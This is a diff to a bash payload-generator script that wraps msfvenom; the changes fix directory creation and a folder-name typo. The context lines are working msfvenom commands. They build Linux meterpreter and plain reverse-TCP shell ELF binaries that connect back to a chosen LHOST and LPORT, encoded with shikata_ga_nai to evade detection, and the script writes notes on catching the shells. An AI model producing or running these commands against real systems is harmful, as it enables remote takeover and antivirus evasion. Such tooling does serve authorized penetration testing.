@@ -18,7 +18,7 @@ echo -e "[4] Windows"
 echo -e "\n"
 read -p "[+] Select a platform? [1/2/3/4] " input
 echo -e "\n"
-    if [ -d /$USER/Payload_Generator/Payload_List ]; 
+    if [ -d ./Payload_List ]; 
         then
 		    echo -e "    ${RED}Payload_List Direcorty exist${XX}"
         else
@@ -260,6 +260,8 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x86-shikata.elf
             msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Meterpreter_Binaries/Stageless/shell-x64-shikata.elf
         echo -e "\n${BLUE}[+] Creating Non_Meterpreter Staged Payload:${XX}"
+        mkdir Payload_List/Binary 2>/dev/null
+        mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
         mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Staged 2>/dev/null
             echo -e "[*] The following reverse shell will run with meterpreter or netcat, make sure you set the payload and other options on your meterpreter:" > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
             echo -e "\n- set payload linux/x86/shell_reverse_tcp for shell-x86.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
@@ -274,7 +276,9 @@ if [[ $input == "1" ]]; then ## Linux
             msfvenom -p linux/x86/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x86-shikata.elf
             msfvenom -p linux/x64/shell/reverse_tcp LHOST=$IP LPORT=$PO -f elf -e x86/shikata_ga_nai -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/shell-x64-shikata.elf
         echo -e "\n${BLUE}[+] Creating Non_Meterpreter Stageless Payload:${XX}"
-        mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Stagedless
+        mkdir Payload_List/Binary 2>/dev/null
+        mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
+        mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Stageless 2>/dev/null
             echo -e "[*] The following reverse shell will run with meterpreter or netcat, make sure you set the payload and other options on your meterpreter:" > Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
             echo -e "\n- set payload linux/x86/shell_reverse_tcp for x86_shell_rev.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
             echo -e "\n- set payload linux/x64/shell_reverse_tcp for x64_shell_rev.elf" >> Payload_List/Binary/Non_Meterpreter_Binaries/Stageless/Read_Me.txt
